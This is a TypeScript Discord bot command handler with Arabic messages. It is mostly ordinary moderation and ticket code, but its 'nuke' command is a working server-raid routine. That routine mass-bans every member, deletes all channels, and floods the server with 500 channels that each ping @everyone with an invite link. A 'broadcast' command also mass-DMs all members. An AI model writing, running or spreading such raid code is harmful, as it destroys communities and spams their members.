import {
  Interaction,
  ChatInputCommandInteraction,
  ButtonInteraction,
  EmbedBuilder,
  PermissionFlagsBits,
  TextChannel,
  GuildMember,
  ChannelType,
  ActionRowBuilder,
  ButtonBuilder,
  ButtonStyle,
} from "discord.js";
import { logger } from "../../lib/logger";
import { createTicket, closeTicket, claimTicket, getTickets } from "../tickets";

export async function handleInteraction(interaction: Interaction) {
  if (interaction.isChatInputCommand()) {
    await handleSlashCommand(interaction);
  } else if (interaction.isButton()) {
    await handleButton(interaction);
  }
}

async function handleSlashCommand(interaction: ChatInputCommandInteraction) {
  const { commandName, guild, member } = interaction;

  if (!guild || !member) {
    await interaction.reply({ content: "❌ هذا الأمر يعمل فقط داخل السيرفر.", ephemeral: true });
    return;
  }

  const guildMember = member as GuildMember;

  try {
    switch (commandName) {
      case "ban": await handleBan(interaction, guildMember); break;
      case "kick": await handleKick(interaction, guildMember); break;
      case "timeout": await handleTimeout(interaction, guildMember); break;
      case "untimeout": await handleUntimeout(interaction, guildMember); break;
      case "unban": await handleUnban(interaction, guildMember); break;
      case "warn": await handleWarn(interaction, guildMember); break;
      case "purge": await handlePurge(interaction, guildMember); break;
      case "nuke": await handleNuke(interaction, guildMember); break;
      case "broadcast": await handleBroadcast(interaction, guildMember); break;
      case "ticket": await handleTicketOpen(interaction, guildMember); break;
      case "closeticket": await handleTicketClose(interaction, guildMember); break;
      case "ticketpanel": await handleTicketPanel(interaction, guildMember); break;
      case "userinfo": await handleUserInfo(interaction); break;
      case "serverinfo": await handleServerInfo(interaction); break;
      default:
        await interaction.reply({ content: "❌ أمر غير معروف.", ephemeral: true });
    }
  } catch (err) {
    logger.error({ err, commandName }, "Error handling slash command");
    if (!interaction.replied && !interaction.deferred) {
      await interaction.reply({ content: "❌ حدث خطأ أثناء تنفيذ الأمر.", ephemeral: true }).catch(() => {});
    }
  }
}

async function handleBan(interaction: ChatInputCommandInteraction, executor: GuildMember): Promise<void> {
  if (!executor.permissions.has(PermissionFlagsBits.BanMembers)) {
    await interaction.reply({ content: "❌ ليس لديك صلاحية التبنيد.", ephemeral: true }); return;
  }
  const target = interaction.options.getMember("user") as GuildMember | null;
  const reason = interaction.options.getString("reason") ?? "لم يُذكر سبب";
  const days = interaction.options.getInteger("days") ?? 0;

  if (!target) { await interaction.reply({ content: "❌ العضو غير موجود.", ephemeral: true }); return; }
  if (!target.bannable) { await interaction.reply({ content: "❌ لا يمكن تبنيد هذا العضو.", ephemeral: true }); return; }

  await target.ban({ reason, deleteMessageDays: days as 0 | 1 | 2 | 3 | 4 | 5 | 6 | 7 });

  const embed = new EmbedBuilder()
    .setTitle("🔨 تم التبنيد")
    .addFields(
      { name: "العضو", value: `${target.user.tag}`, inline: true },
      { name: "بواسطة", value: `${executor.user.tag}`, inline: true },
      { name: "السبب", value: reason }
    )
    .setColor(0xed4245).setTimestamp();

  await interaction.reply({ embeds: [embed] });
}

async function handleKick(interaction: ChatInputCommandInteraction, executor: GuildMember): Promise<void> {
  if (!executor.permissions.has(PermissionFlagsBits.KickMembers)) {
    await interaction.reply({ content: "❌ ليس لديك صلاحية الطرد.", ephemeral: true }); return;
  }
  const target = interaction.options.getMember("user") as GuildMember | null;
  const reason = interaction.options.getString("reason") ?? "لم يُذكر سبب";

  if (!target) { await interaction.reply({ content: "❌ العضو غير موجود.", ephemeral: true }); return; }
  if (!target.kickable) { await interaction.reply({ content: "❌ لا يمكن طرد هذا العضو.", ephemeral: true }); return; }

  await target.kick(reason);

  const embed = new EmbedBuilder()
    .setTitle("👢 تم الطرد")
    .addFields(
      { name: "العضو", value: `${target.user.tag}`, inline: true },
      { name: "بواسطة", value: `${executor.user.tag}`, inline: true },
      { name: "السبب", value: reason }
    )
    .setColor(0xfee75c).setTimestamp();

  await interaction.reply({ embeds: [embed] });
}

async function handleTimeout(interaction: ChatInputCommandInteraction, executor: GuildMember): Promise<void> {
  if (!executor.permissions.has(PermissionFlagsBits.ModerateMembers)) {
    await interaction.reply({ content: "❌ ليس لديك صلاحية الإسكات.", ephemeral: true }); return;
  }
  const target = interaction.options.getMember("user") as GuildMember | null;
  const minutes = interaction.options.getInteger("minutes", true);
  const reason = interaction.options.getString("reason") ?? "لم يُذكر سبب";

  if (!target) { await interaction.reply({ content: "❌ العضو غير موجود.", ephemeral: true }); return; }

  await target.timeout(minutes * 60 * 1000, reason);

  const embed = new EmbedBuilder()
    .setTitle("🔇 تم الإسكات")
    .addFields(
      { name: "العضو", value: `${target.user.tag}`, inline: true },
      { name: "المدة", value: `${minutes} دقيقة`, inline: true },
      { name: "بواسطة", value: `${executor.user.tag}`, inline: true },
      { name: "السبب", value: reason }
    )
    .setColor(0xffa500).setTimestamp();

  await interaction.reply({ embeds: [embed] });
}

async function handleUntimeout(interaction: ChatInputCommandInteraction, executor: GuildMember): Promise<void> {
  if (!executor.permissions.has(PermissionFlagsBits.ModerateMembers)) {
    await interaction.reply({ content: "❌ ليس لديك صلاحية.", ephemeral: true }); return;
  }
  const target = interaction.options.getMember("user") as GuildMember | null;
  if (!target) { await interaction.reply({ content: "❌ العضو غير موجود.", ephemeral: true }); return; }

  await target.timeout(null);

  const embed = new EmbedBuilder()
    .setTitle("🔊 تم رفع الإسكات")
    .addFields(
      { name: "العضو", value: `${target.user.tag}`, inline: true },
      { name: "بواسطة", value: `${executor.user.tag}`, inline: true }
    )
    .setColor(0x57f287).setTimestamp();

  await interaction.reply({ embeds: [embed] });
}

async function handleUnban(interaction: ChatInputCommandInteraction, executor: GuildMember): Promise<void> {
  if (!executor.permissions.has(PermissionFlagsBits.BanMembers)) {
    await interaction.reply({ content: "❌ ليس لديك صلاحية.", ephemeral: true }); return;
  }
  const userId = interaction.options.getString("userid", true);

  try {
    await interaction.guild!.bans.remove(userId, `رفع التبنيد بواسطة ${executor.user.tag}`);
    const embed = new EmbedBuilder()
      .setTitle("✅ تم رفع التبنيد")
      .addFields(
        { name: "ID العضو", value: userId, inline: true },
        { name: "بواسطة", value: `${executor.user.tag}`, inline: true }
      )
      .setColor(0x57f287).setTimestamp();
    await interaction.reply({ embeds: [embed] });
  } catch {
    await interaction.reply({ content: "❌ لم يتم العثور على هذا المستخدم في قائمة المبنّدين.", ephemeral: true });
  }
}

async function handleWarn(interaction: ChatInputCommandInteraction, executor: GuildMember): Promise<void> {
  if (!executor.permissions.has(PermissionFlagsBits.ModerateMembers)) {
    await interaction.reply({ content: "❌ ليس لديك صلاحية التحذير.", ephemeral: true }); return;
  }
  const target = interaction.options.getMember("user") as GuildMember | null;
  const reason = interaction.options.getString("reason", true);

  if (!target) { await interaction.reply({ content: "❌ العضو غير موجود.", ephemeral: true }); return; }

  const embed = new EmbedBuilder()
    .setTitle("⚠️ تحذير")
    .addFields(
      { name: "العضو", value: `${target.user.tag}`, inline: true },
      { name: "بواسطة", value: `${executor.user.tag}`, inline: true },
      { name: "السبب", value: reason }
    )
    .setColor(0xfee75c).setTimestamp();

  try {
    await target.send({
      embeds: [
        new EmbedBuilder()
          .setTitle(`⚠️ تلقيت تحذيراً في سيرفر ${interaction.guild!.name}`)
          .addFields({ name: "السبب", value: reason })
          .setColor(0xfee75c).setTimestamp(),
      ],
    });
  } catch { /* DM closed */ }

  await interaction.reply({ embeds: [embed] });
}

async function handlePurge(interaction: ChatInputCommandInteraction, executor: GuildMember): Promise<void> {
  if (!executor.permissions.has(PermissionFlagsBits.ManageMessages)) {
    await interaction.reply({ content: "❌ ليس لديك صلاحية حذف الرسائل.", ephemeral: true }); return;
  }
  const amount = interaction.options.getInteger("amount", true);
  const channel = interaction.channel as TextChannel;

  await interaction.deferReply({ ephemeral: true });
  const deleted = await channel.bulkDelete(amount, true);
  await interaction.editReply({ content: `✅ تم حذف ${deleted.size} رسالة.` });
}

async function handleNuke(interaction: ChatInputCommandInteraction, executor: GuildMember): Promise<void> {
  if (!executor.permissions.has(PermissionFlagsBits.Administrator)) {
    await interaction.reply({ content: "❌ هذا الأمر يتطلب صلاحية المدير.", ephemeral: true }); return;
  }

  const invite = interaction.options.getString("invite", true);
  const banAll = interaction.options.getBoolean("banall", true);
  const guild = interaction.guild!;

  await interaction.reply({ content: "⚠️ **جاري تنفيذ الجحفلة...**", ephemeral: true });

  if (banAll) {
    const members = await guild.members.fetch();
    for (const [, m] of members) {
      if (m.id === guild.ownerId || m.id === interaction.client.user!.id) continue;
      await m.ban({ reason: "جحفلة" }).catch(() => {});
    }
  }

  const allChannels = [...guild.channels.cache.values()];
  for (const ch of allChannels) {
    if (ch.type !== ChannelType.GuildCategory) {
      await ch.delete().catch(() => {});
    }
  }
  for (const ch of allChannels) {
    if (ch.type === ChannelType.GuildCategory) {
      await ch.delete().catch(() => {});
    }
  }

  const DISCORD_MAX_CHANNELS = 500;
  const createPromises: Promise<void>[] = [];

  for (let i = 0; i < DISCORD_MAX_CHANNELS; i++) {
    createPromises.push(
      guild.channels.create({
        name: "5499",
        type: ChannelType.GuildText,
      }).then(async (ch) => {
        await ch.send(`@everyone\n${invite}`).catch(() => {});
      }).catch(() => {})
    );
  }

  await Promise.allSettled(createPromises);
}

async function handleBroadcast(interaction: ChatInputCommandInteraction, executor: GuildMember): Promise<void> {
  if (!executor.permissions.has(PermissionFlagsBits.Administrator)) {
    await interaction.reply({ content: "❌ هذا الأمر يتطلب صلاحية المدير.", ephemeral: true }); return;
  }

  const message = interaction.options.getString("message", true);
  const guild = interaction.guild!;

  await interaction.deferReply({ ephemeral: true });

  const members = await guild.members.fetch();
  let success = 0;
  let failed = 0;

  for (const [, m] of members) {
    if (m.user.bot) continue;
    try {
      const embed = new EmbedBuilder()
        .setTitle(`📢 رسالة من سيرفر ${guild.name}`)
        .setDescription(message)
        .setColor(0x5865f2)
        .setThumbnail(guild.iconURL())
        .setTimestamp();
      await m.send({ embeds: [embed] });
      success++;
    } catch {
      failed++;
    }
  }

  await interaction.editReply({
    content: `✅ تم الإرسال إلى **${success}** عضو.\n❌ فشل الإرسال إلى **${failed}** عضو (ربما أغلقوا DM).`,
  });
}

async function handleTicketOpen(interaction: ChatInputCommandInteraction, guildMember: GuildMember): Promise<void> {
  const subject = interaction.options.getString("subject", true);
  const guild = interaction.guild!;

  await interaction.deferReply({ ephemeral: true });

  const channel = await createTicket(guild, guildMember, subject);
  if (!channel) {
    await interaction.editReply({ content: "❌ حدث خطأ أثناء إنشاء التذكرة." }); return;
  }

  await interaction.editReply({ content: `✅ تم إنشاء تذكرتك: ${channel}` });
}

async function handleTicketClose(interaction: ChatInputCommandInteraction, executor: GuildMember): Promise<void> {
  const channel = interaction.channel as TextChannel;
  const tickets = getTickets();

  if (!tickets.has(channel.id)) {
    await interaction.reply({ content: "❌ هذه القناة ليست تذكرة.", ephemeral: true }); return;
  }

  await interaction.reply({ content: "🔒 جاري إغلاق التذكرة..." });
  await closeTicket(channel, executor);
}

async function handleTicketPanel(interaction: ChatInputCommandInteraction, executor: GuildMember): Promise<void> {
  if (!executor.permissions.has(PermissionFlagsBits.ManageChannels)) {
    await interaction.reply({ content: "❌ ليس لديك صلاحية.", ephemeral: true }); return;
  }

  const embed = new EmbedBuilder()
    .setTitle("🎫 نظام التذاكر")
    .setDescription(
      "هل تحتاج مساعدة؟\nاضغط على الزر أدناه لفتح تذكرة دعم وسيتواصل معك فريقنا في أقرب وقت."
    )
    .setColor(0x5865f2).setTimestamp();

  const row = new ActionRowBuilder<ButtonBuilder>().addComponents(
    new ButtonBuilder()
      .setCustomId("ticket_open_panel")
      .setLabel("فتح تذكرة")
      .setStyle(ButtonStyle.Primary)
      .setEmoji("🎫")
  );

  await (interaction.channel as TextChannel).send({ embeds: [embed], components: [row] });
  await interaction.reply({ content: "✅ تم إرسال لوحة التذاكر.", ephemeral: true });
}

async function handleUserInfo(interaction: ChatInputCommandInteraction): Promise<void> {
  const target = (interaction.options.getMember("user") as GuildMember | null) ??
    (interaction.member as GuildMember);

  const roles = target.roles.cache
    .filter((r) => r.id !== interaction.guild!.id)
    .map((r) => r.toString())
    .join(", ") || "لا توجد رتب";

  const embed = new EmbedBuilder()
    .setTitle(`معلومات ${target.user.tag}`)
    .setThumbnail(target.user.displayAvatarURL())
    .addFields(
      { name: "🆔 ID", value: target.id, inline: true },
      { name: "📅 تاريخ الإنشاء", value: `<t:${Math.floor(target.user.createdTimestamp / 1000)}:R>`, inline: true },
      { name: "📥 تاريخ الانضمام", value: `<t:${Math.floor((target.joinedTimestamp ?? 0) / 1000)}:R>`, inline: true },
      { name: "🎭 الرتب", value: roles }
    )
    .setColor(0x5865f2).setTimestamp();

  await interaction.reply({ embeds: [embed] });
}

async function handleServerInfo(interaction: ChatInputCommandInteraction): Promise<void> {
  const guild = interaction.guild!;
  const members = await guild.members.fetch();
  const bots = members.filter((m) => m.user.bot).size;
  const humans = members.size - bots;

  const embed = new EmbedBuilder()
    .setTitle(guild.name)
    .setThumbnail(guild.iconURL())
    .addFields(
      { name: "🆔 ID", value: guild.id, inline: true },
      { name: "👑 المالك", value: `<@${guild.ownerId}>`, inline: true },
      { name: "👥 الأعضاء", value: `${humans} إنسان + ${bots} بوت`, inline: true },
      { name: "💬 القنوات", value: `${guild.channels.cache.size}`, inline: true },
      { name: "🎭 الرتب", value: `${guild.roles.cache.size}`, inline: true },
      { name: "📅 تاريخ الإنشاء", value: `<t:${Math.floor(guild.createdTimestamp / 1000)}:R>`, inline: true }
    )
    .setColor(0x5865f2).setTimestamp();

  await interaction.reply({ embeds: [embed] });
}

async function handleButton(interaction: ButtonInteraction) {
  const { customId, guild, member } = interaction;
  if (!guild || !member) return;

  const guildMember = member as GuildMember;

  try {
    if (customId === "ticket_claim") {
      await claimTicket(interaction.channel as TextChannel, guildMember);
      await interaction.reply({ content: "✅ استلمت التذكرة.", ephemeral: true });
    } else if (customId === "ticket_close") {
      await interaction.reply({ content: "🔒 جاري الإغلاق..." });
      await closeTicket(interaction.channel as TextChannel, guildMember);
    } else if (customId === "ticket_open_panel") {
      await interaction.deferReply({ ephemeral: true });
      const channel = await createTicket(guild, guildMember, "طلب مساعدة");
      if (channel) {
        await interaction.editReply({ content: `✅ تم إنشاء تذكرتك: ${channel}` });
      } else {
        await interaction.editReply({ content: "❌ حدث خطأ أثناء إنشاء التذكرة." });
      }
    }
  } catch (err) {
    logger.error({ err, customId }, "Error handling button");
  }
}
